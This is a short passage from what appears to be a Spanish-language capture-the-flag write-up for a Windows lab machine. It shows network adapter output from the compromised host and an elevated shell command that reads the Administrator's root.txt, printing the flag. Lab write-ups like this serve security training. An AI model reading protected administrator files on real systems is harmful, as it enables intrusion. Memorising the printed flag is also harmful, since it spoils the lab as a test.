   Link-local IPv6 Address . . . . . : fe80::699a:78f7:93de:fb19%12
   IPv4 Address. . . . . . . . . . . : 10.10.11.102
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Ethernet adapter vEthernet (nat):

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::fda9:dd18:b1a7:b7d6%18
   IPv4 Address. . . . . . . . . . . : 172.21.96.1
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 
```

Puedo visualizar la segunda flag

```null
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
0ead38ad6db1d51777b66d7b7604977d
```